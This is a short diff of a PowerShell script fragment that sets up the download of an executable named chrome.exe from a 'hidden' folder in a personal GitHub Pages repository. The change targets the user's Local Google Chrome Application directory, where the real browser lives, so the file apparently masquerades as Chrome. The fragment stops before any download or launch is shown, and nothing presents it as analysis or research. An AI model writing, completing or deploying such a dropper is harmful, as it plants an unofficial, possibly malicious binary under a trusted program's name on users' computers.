@@ -1,5 +1,5 @@
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/chrome.exe"
-$destinationPath = "$env:USERPROFILE\AppData\Google\Chrome\Application"
+$destinationPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\Application"
 $exePath = Join-Path -Path $destinationPath -ChildPath "chrome.exe"
 
 if (-not (Test-Path -Path $destinationPath)) {
